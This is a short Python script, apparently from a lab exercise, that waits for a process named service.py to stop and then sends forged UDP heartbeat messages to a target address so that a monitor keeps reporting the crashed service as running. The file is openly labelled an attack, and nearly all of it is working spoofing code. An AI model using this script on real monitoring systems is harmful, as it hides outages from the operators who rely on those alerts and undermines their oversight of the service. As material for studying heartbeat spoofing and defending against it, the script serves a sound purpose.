
import socket
import time
import sys
import subprocess

heartbeat_message = bytes("Service is up! (This is attack)", "utf-8")

def is_service_running():
    try:
        result = subprocess.run(["pgrep", "-f", "service.py"])
        return result.returncode == 0 ## 0 means process is running, 1 no process found 2 or 3, error.

    except Exception as e:
        print(f"[ERROR] Process check failed: {e}")
        return False

def send(target_ip, target_port, interval, count):
    sent = 0

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            print(f"[ATTACK] Heartbeat audit targeting {target_ip}:{target_port}")

            while count == 0 or sent < count:
                sock.sendto(heartbeat_message, (target_ip, target_port))
                sent += 1

                print(f"[ATTACK] Forged heartbeat #{sent} sent")
                time.sleep(interval)

    except KeyboardInterrupt:
        print("Monitoring stopped")

    except OSError as e:
        print(f"[ERROR] Socket error: {e}")


if __name__ == "__main__":
    ## argv[0] will always be attack.py
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    interval = 3

    count = int(sys.argv[4]) if len(sys.argv) > 4 else 0

    if not 1 <= target_port <= 65535 or interval < 0.1 or count < 0:
        sys.exit("invalid args")

    try:
        print("[ATTACK] Starting...")
        tally = 0

        while True:
            if not is_service_running():
                print("[ATTACK] Crash Detected")
                break
            else:
                print(f"[ATTACK] Process is running #{tally}")
            tally += 1
            time.sleep(interval)

    except Exception as e:
        print(f"[ERROR]: {e}")

    send(target_ip, target_port, interval, count)
